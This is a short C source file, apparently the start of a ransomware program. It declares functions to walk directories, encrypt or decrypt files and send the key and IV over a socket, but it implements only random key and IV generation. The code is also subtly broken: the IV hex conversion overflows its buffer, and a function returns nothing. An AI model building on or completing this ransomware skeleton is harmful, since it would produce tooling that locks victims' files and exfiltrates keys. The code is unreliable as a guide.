#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <openssl/rand.h>



void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
	printf("Bon travail!\n");
	unsigned char key[33];
    int sizeKey = 33;
    unsigned char iv[17];
    int sizeIv = 17;
    char pKey[65];
    char pIv[33];
	int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
	printf("%d\n", status);
	printf("%s", key);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	RAND_priv_bytes(key, sizeKey);
	RAND_priv_bytes(iv, sizeIv);
	bytes_to_hexa(key, pKey,sizeKey );
	bytes_to_hexa(iv, pIv, sizeKey);
}
